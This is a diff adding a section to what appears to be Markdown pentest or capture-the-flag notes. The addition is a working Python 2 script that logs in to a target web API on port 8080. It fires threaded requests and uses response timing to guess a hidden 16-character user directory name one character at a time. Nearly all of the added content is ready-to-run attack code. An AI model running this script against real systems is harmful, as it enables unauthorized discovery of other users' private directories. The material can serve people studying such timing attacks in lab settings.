@@ -31,3 +31,59 @@ for num in $(seq 0 15 | tac); do
   done
 done
 ```
+
+## Similar Python url fuzz
+```
+import string
+import requests
+import sys
+import json
+import threading
+import Queue
+import time
+
+
+character_set = 'abcdefghijklmnopqrstuvwxyz0123456789'
+
+def queue_get_all(q, max_items):
+    items = []
+    for numOfItemsRetrieved in range(0, max_items):
+        try:
+            if numOfItemsRetrieved == max_items:
+                break
+            items.append(q.get_nowait())
+        except:
+            break
+    return items
+
+def times_out(q, alpha, session, ip_address, characters, uid,  timeout):
+    start = time.time()
+    res = json.loads(session.get(  'http://{}:8080/api/list/files/{}/{}'.format(ip_address, uid, characters)).text)
+    end = time.time()
+    q.put( [alpha, bool(end - start < timeout)] )
+
+
+def iterate(character_set, length, ip_address, uid, username, password ):
+    session = requests.Session()
+    results = session.post('http://{}:8080/api/login'.format(ip_address),data={'username': username, 'password': password})
+    final_character = ''
+    for num in range(length):
+        padding_back = '_' * ((length - num)-1)
+        q = Queue.Queue()
+        for alpha in character_set:
+            threading.Thread(target=times_out, args=[q, alpha, session, ip_address, (final_character + alpha + padding_back), uid, (length - num) ]).start()
+        time.sleep((length - num) + 1)
+        results = queue_get_all(q, len(character_set))
+        final_character += [x[0] for x in results if x[1]][0]
+        print(final_character)
+    print('The user directory with UID {} is {}'.format(uid, final_character))
+
+
+
+if __name__ == "__main__":
+    #       Character_Set,  Length to send, ip address,    user id number,  username,           password
+    try:
+        iterate(character_set,  16,              sys.argv[1],   sys.argv[2],     sys.argv[3],        sys.argv[4])
+    except:
+        print('Ex - python bruteforce_directory.py 127.0.0.1 1 admin password')
+```
